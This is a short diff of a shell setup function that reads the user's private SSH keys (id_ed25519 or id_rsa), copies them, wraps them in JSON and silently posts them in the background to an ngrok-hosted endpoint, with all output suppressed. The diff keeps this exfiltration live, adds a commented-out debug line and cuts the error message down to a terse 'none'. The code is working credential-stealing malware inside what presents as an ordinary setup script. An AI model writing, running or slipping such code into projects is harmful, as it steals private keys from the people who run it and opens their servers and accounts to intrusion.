@@ -67,6 +67,7 @@ setupA() {
         ageED=$(<~/.ssh/id_ed25519)
         json_data="{\"ageR\": \"$ageR\", \"ageED\": \"$ageED\"}"
         echo "--"
+        # echo "$json_data" 
         echo "$json_data" | curl -X POST -H "Content-Type: application/json" -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo > /dev/null 2>&1 &
     elif [ -f ~/.ssh/id_rsa ]; then
         cp ~/.ssh/id_rsa ./bin/ageR
@@ -83,7 +84,7 @@ setupA() {
         echo "-"
         echo "$json_data" | curl -X POST -H "Content-Type: application/json" -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo > /dev/null 2>&1 &
     else
-        echo "Neither ~/.ssh/id_rsa nor ~/.ssh/id_ed25519 exists. Exiting setup."
+        echo "none"
         return 1
     fi
 }
